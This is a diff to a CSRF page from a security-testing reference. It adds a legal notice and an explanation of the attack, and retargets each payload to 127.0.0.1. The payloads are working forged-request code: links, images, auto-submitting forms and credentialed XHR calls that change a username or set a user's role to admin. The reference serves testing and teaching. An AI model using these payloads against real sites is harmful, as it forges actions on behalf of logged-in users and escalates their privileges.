@@ -1,4 +1,8 @@
-# Cross-Site Request Forgery
+# Cross-Site Request Forgery (CSRF)
+
+> **Legal Notice:** This document is for authorized security testing and educational purposes only. Only test against systems you own or have explicit written permission to assess. Unauthorized testing is illegal under the CFAA, UK Computer Misuse Act, and equivalent laws. **Obtain written scope authorization before testing.**
+
+---
 
 > Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
 
@@ -22,7 +26,7 @@
 
 ## Methodology
 
-![CSRF_cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true)
+> A CSRF attack abuses the trust a site has in a user's browser. When a user is authenticated, their session cookie is sent automatically with every request — including those triggered from another origin. The attack exploits this by forging requests from an attacker-controlled page.
 
 ## Payloads
 
@@ -31,19 +35,19 @@ When you are logged in to a certain site, you typically have a session. The iden
 ### HTML GET - Requiring User Interaction
 
 ```html
-<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
+<a href="http://127.0.0.1/api/setusername?username=CSRFd">Click Me</a>
 ```
 
 ### HTML GET - No User Interaction
 
 ```html
-<img src="http://www.example.com/api/setusername?username=CSRFd">
+<img src="http://127.0.0.1/api/setusername?username=CSRFd">
 ```
 
 ### HTML POST - Requiring User Interaction
 
 ```html
-<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+<form action="http://127.0.0.1/api/setusername" enctype="text/plain" method="POST">
  <input name="username" type="hidden" value="CSRFd" />
  <input type="submit" value="Submit Request" />
 </form>
@@ -52,7 +56,7 @@ When you are logged in to a certain site, you typically have a session. The iden
 ### HTML POST - AutoSubmit - No User Interaction
 
 ```html
-<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+<form id="autosubmit" action="http://127.0.0.1/api/setusername" enctype="text/plain" method="POST">
  <input name="username" type="hidden" value="CSRFd" />
  <input type="submit" value="Submit Request" />
 </form>
@@ -68,7 +72,7 @@ When you are logged in to a certain site, you typically have a session. The iden
 ```html
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://www.example.com/api/currentuser");
+xhr.open("GET", "http://127.0.0.1/api/currentuser");
 xhr.send();
 </script>
 ```
@@ -78,7 +82,7 @@ xhr.send();
 ```html
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.open("POST", "http://127.0.0.1/api/setrole");
 //application/json is not allowed in a simple request. text/plain is the default
 xhr.setRequestHeader("Content-Type", "text/plain");
 //You will probably want to also try one or both of these
@@ -93,7 +97,7 @@ xhr.send('{"role":admin}');
 ```html
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.open("POST", "http://127.0.0.1/api/setrole");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 xhr.send('{"role":admin}');
